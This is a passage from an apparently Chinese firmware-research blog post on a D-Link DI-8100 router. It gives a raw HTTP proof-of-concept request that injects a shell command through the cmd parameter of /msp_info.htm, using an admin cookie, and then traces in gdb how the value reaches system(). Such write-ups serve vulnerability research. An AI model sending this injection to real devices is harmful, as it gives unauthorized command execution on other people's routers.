<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805163634264.png" srcset="/img/loading.gif" lazyload alt="image-20240805163634264"></p>
<p>命令执行poc</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /msp_info.htm?flag=cmd&amp;cmd=%<span class="hljs-number">60</span>%<span class="hljs-number">65</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">62</span>%<span class="hljs-number">62</span>%<span class="hljs-number">60</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span><br><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Ubuntu; Linux x86_64; rv:<span class="hljs-number">128</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">128</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/png,image/svg+xml,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><br><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><br><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">Cookie</span>: wys_userid=admin,wys_passwd=<span class="hljs-number">520</span>E1BFD4CDE217D0A5824AE7EA60632<br><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">Priority</span>: u=<span class="hljs-number">0</span>, i<br></code></pre></td></tr></table></figure>

<p>接下来动调</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">gdb-multiarch ./usr/sbin/jhttpd -<span class="hljs-variable language_">x</span> <span class="hljs-variable language_">script</span><br></code></pre></td></tr></table></figure>

<p>发的包就是上面的poc</p>
<p>打断点到0044D74C，也就是msp_info_htm的开头</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805173200857.png" srcset="/img/loading.gif" lazyload alt="image-20240805173200857"></p>
<p>第一个httpd_get_parm获取到flag参数的值</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805183037865.png" srcset="/img/loading.gif" lazyload alt="image-20240805183037865"></p>
<p>strcmp开始比较flag参数的值</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805183321904.png" srcset="/img/loading.gif" lazyload alt="image-20240805183321904"></p>
<p>下断点直接到判断是否为cmd的位置</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805183910293.png" srcset="/img/loading.gif" lazyload alt="image-20240805183910293"></p>
<p>flag参数的cmd匹配成功，跳转到if判断内部</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805184751826.png" srcset="/img/loading.gif" lazyload alt="image-20240805184751826"></p>
<p>跳入http_get_parm函数截取cmd参数的值</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805185748700.png" srcset="/img/loading.gif" lazyload alt="image-20240805185748700"></p>
<p>V0寄存器获取到cmd的参数值</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190106386.png" srcset="/img/loading.gif" lazyload alt="image-20240805190106386"></p>
<p>snprintf开始拼接系统命令</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190544005.png" srcset="/img/loading.gif" lazyload alt="image-20240805190544005"></p>
<p>system函数执行</p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190645152.png" srcset="/img/loading.gif" lazyload alt="image-20240805190645152"></p>
<p>执行成功   </p>
<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240805190737110.png" srcset="/img/loading.gif" lazyload alt="image-20240805190737110"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>DI-8100固件分析</div>
      <div>http://groundctl2majortom.github.io/2024/06/04/DI-8100固件分析/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>GroundCtl2MajorTom</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年6月4日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/07/04/%E5%90%88%E5%8B%A4NWA1100%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/" title="合勤NWA1100固件提取">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">合勤NWA1100固件提取</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/11/01/vulnhub-DevGuru-1/" title="vulnhub_DevGuru_1">
                        <span class="hidden-mobile">vulnhub_DevGuru_1</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
